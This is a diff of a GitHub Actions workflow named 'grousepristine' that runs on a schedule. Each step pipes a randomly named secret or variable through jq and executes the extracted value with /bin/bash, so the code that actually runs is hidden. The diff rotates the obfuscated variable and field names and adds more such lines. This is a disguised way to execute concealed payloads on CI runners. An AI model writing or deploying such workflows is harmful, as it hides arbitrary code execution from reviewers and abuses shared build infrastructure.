@@ -1,23 +1,26 @@
 name: grousepristine
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 4/6 * * *'
+    - cron: '38 1/6 * * *'
 
-jobs:  # 23202
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: grousepristine
         env:
-          i3505: ${{ secrets.i3505 }}
+          zxrkg5757: ${{ secrets.zxrkg5757 }}
         run: |
-          echo $i3505 | jq -r .zb00 | /bin/bash
-          echo $cgmar262 | jq -r .hq5883 | /bin/bash
-          echo $vfjr62350 | jq -r .a4 | /bin/bash
-          echo $o546 | jq -r .z30595 | /bin/bash
-          echo $c013 | jq -r .as9 | /bin/bash
+          echo $zxrkg5757 | jq -r .u33714 | /bin/bash
+          echo $fuyof329 | jq -r .mgcv9 | /bin/bash
+          echo $vijzn53 | jq -r .zhyos87235 | /bin/bash
+          echo $fhuh337 | jq -r .riqmf7 | /bin/bash
+          echo $tbzsq71545 | jq -r .eapif29016 | /bin/bash
+          echo $dwj4 | jq -r .zkkzn8 | /bin/bash
+          echo $tvvx340 | jq -r .zu52 | /bin/bash
+          echo $yjqju69 | jq -r .gi9 | /bin/bash
+          echo $ywbp60019 | jq -r .u5894 | /bin/bash
+          echo $dx23 | jq -r .t19724 | /bin/bash
 
